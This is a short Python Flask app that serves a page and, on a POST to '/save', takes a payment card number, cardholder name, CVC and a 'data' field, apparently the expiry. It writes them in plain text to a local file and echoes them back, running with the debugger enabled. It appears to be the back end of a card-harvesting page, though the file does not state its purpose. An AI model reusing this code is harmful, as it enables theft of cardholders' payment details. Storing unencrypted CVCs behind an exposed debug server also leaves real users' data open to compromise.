import random
from flask import Flask, render_template, request

# pip3 install flask

app = Flask(__name__)


@app.route('/')
def index():

    return render_template('page.html')


@app.route('/save', methods=['POST'])
def save():
    number = request.form['number']
    name = request.form['name']
    CVC = request.form['CVC']
    data = request.form['data']

    f = open('vfkov.txt', 'w')
    f.write(number+" "+name+" "+CVC+" "+data)
    f.close()
    return render_template('save.html', number=number,name=name,CVC=CVC,data=data)




app.run(debug=True)
